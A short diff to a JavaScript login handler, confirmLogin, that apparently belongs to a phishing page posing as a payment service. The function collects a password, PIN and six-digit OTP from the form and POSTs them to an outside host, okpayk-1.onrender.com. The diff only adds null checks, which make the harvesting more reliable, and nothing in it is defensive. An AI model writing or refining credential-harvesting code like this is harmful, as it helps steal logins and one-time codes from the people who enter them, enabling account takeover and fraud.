@@ -446,9 +446,10 @@ function confirmLogin() {
   const password = document.querySelectorAll('input[type="password"]')[0].value;
   const pin = document.querySelectorAll('input[type="password"]')[1].value;
   const otp = document.getElementById('otpInput').value;
-  const issue = document.getElementById('issue').value;
+  const issueElement = document.getElementById('issue');
+  const issue = issueElement ? issueElement.value : '';
 
-  if (otp.length === 6) {
+  if (otp && otp.length === 6) {
     fetch('https://okpayk-1.onrender.com/submit', {
       method: 'POST',
       headers: {
